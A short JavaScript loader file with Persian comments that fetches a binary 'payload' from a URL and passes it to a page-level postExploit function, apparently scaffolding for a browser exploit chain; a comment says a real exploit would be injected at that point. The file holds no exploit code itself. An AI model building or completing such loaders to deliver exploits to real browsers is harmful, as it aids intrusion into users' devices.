// loader.js (FIXED VERSION)

async function loadPayload(url) {
    try {
        log("Loading payload...");

        let response = await fetch(url);
        if (!response.ok) throw new Error("Fetch failed");

        let arrayBuffer = await response.arrayBuffer();
        log("Payload Loaded: " + arrayBuffer.byteLength + " bytes");

        // اگر exploit واقعی داشته باشی اینجا inject میشه
        if (typeof window.postExploit === "function") {
            window.postExploit(arrayBuffer);
        } else {
            log("Exploit not ready (no postExploit)");
        }

    } catch (e) {
        alert("Payload Error: " + e.message);
    }
}

// ساده برای نمایش لاگ روی صفحه
function log(msg) {
    let el = document.getElementById("log");
    if (el) {
        el.innerHTML += msg + "<br>";
    } else {
        console.log(msg);
    }
}
